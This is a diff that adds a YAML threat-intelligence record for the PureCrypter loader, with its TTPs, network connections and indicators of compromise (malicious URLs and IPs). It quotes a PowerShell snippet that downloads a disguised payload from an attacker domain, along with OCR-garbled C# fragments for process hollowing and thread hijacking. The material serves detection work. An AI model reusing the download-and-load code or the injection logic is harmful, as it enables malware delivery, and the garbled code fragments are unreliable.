@@ -1,0 +1,89 @@
+description: The report details the PureCrypter loader malware family and its associated
+  tactics, techniques, and procedures (TTPs). It highlights how attackers use this
+  loader to deploy various payloads, including Formbook, Snake Keylogger, Agent Tesla,
+  Redline, and AsyncRAT.
+date: '2022-08-29'
+attribution: wanghao
+malware_families:
+- PureCrypter
+- Formbook
+- Snake Keylogger
+- Agent Tesla
+- Redline
+- AsyncRAT
+- Raccoon
+TTPs:
+  processes:
+  - start.bat
+  - powershell.exe
+  - vbs
+  - Revo.Uninstaller.Pro.4.0.0-Patch.exe
+  commandline:
+  - start.bat
+  - powershell.exe
+  - Revo.Uninstaller.Pro.4.0.0-Patch.exe
+  powershell:
+  - "$webClient = New-Object System.Net.WebClient\n$config = \"http://raphaellasia.com/Ltlippw\
+    \ Ltcchado.bmp\"\n$array = $webClient.DownloadData(new Uri($config))\nfor ($i\
+    \ = 0; $i -lt $array.Length; $i++) {\n  $list2 = New-Object System.Collections.Generic.List[byte]\n\
+    \  $list2.Add($array[$i])\n}\nreturn $list2.ToArray()\n"
+  - 'private void InsertProperty(object res, Eventirgs token)
+
+    Assenbly property = Assembly. Load (Facadelapper. PushProperty ())
+
+    if (true)[this._Connection. property = property:]'
+  - 'private void IncludeProperty(object spec, Bventirgs reg)
+
+    Type type = this. Connection.property.GetType ("Pplyftipfhizgltfwixt. Pihrszhgktndzqjacivry)
+
+    if (8 1= 0)0this._Connection. n_Predicate = type)'
+  - 'private void ManageProperty(object item, Eventirgs counter)
+
+    tDelegate @delegate = Delegate.CreateDelegate (typeot (Action), this. Comnection.m
+    Predicate.Getlethod(\"Phepaghbiylpvykd))'
+  - "internal static void Inject()\n[switch (fsnaghelyved. \\\\uE003. Injllethod)\n\
+    \  tcase \\\\uEO4F. \\\\uEOO1\\\\uEO41. Load_Tnvoke ()break\n  tcase \\\\uEO4F.\
+    \ \\\\uE002\\\\uE043. Hollowing (Resources. \\\\uE004, Nsnaghelyved. \\\\uE003.\
+    \ \\\\uE002)bresk\n  tcase \\\\uEO4F. \\\\uE003Frocess process = milltryi process\
+    \ = Process.GetProcessesByllans (lisnaghelyved. WE003. \\\\wE001) [0])catch| process\
+    \ = Process.GetCurrentProcess())\\\\uE045. ThreadHi jack (string. Fornat (*renotethreadsuspended\
+    \ /unhook: True /blockD1ls: True /pid: {0}\\\", process.Td))\n  if (process.1d\
+    \ == Pracess. GetCurrentProcess (). 1d)[Thread. Sleep (-1))break]\n  tcase \\\\\
+    uEO4F. \\\\uE004\\\\UE045. ThreadHi jack (string. Fornat (functionpointer /unhook:\
+    \ True /blockD1ls: True /pid: {0}, Process.GetCurrentProcess (). 1d))\n  Thread.\
+    \ Sleep (-1)break\n]\n"
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination_address: raphaellasia.com
+    port: '587'
+  - executable: powershell.exe
+    destination_address: origin@raphaellasia.com
+    port: ''
+  - executable: powershell.exe
+    destination_address: origin2022@raphaellasia.com
+    port: ''
+  - executable: powershell.exe
+    destination_address: 185.215.113.89
+    port: HTTP
+  file_modifications:
+  - C:\\Windows\\Temp\\check.exe
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+- MD5: c3f533c47a2f...
+- URL: http://raphaellasia.com/Ltlippw Ltcchado.bmp
+- IP: 185.215.113.89
+- URL: http://marnersstyler.ug/ghjk.exe
+- URL: http://mistitis.ug/zxcvb.exe
+- URL: http://backg...ug/gggate.php
+- URL: https://cdn.discordapp.com/attachments/994652587494232125/1004377750762704896/ps1-6_Hjuvcier.png
+- IP: 212.192.246.195
+- IP: 37.0.11.164
+- IP: 80.66.75.123
+- IP: 89.34.27.167
+- IP: 91.243.44.142
+reference: https://blog.netlab.360.com/purecrypter/
+file_creation_date: May 14, 2025
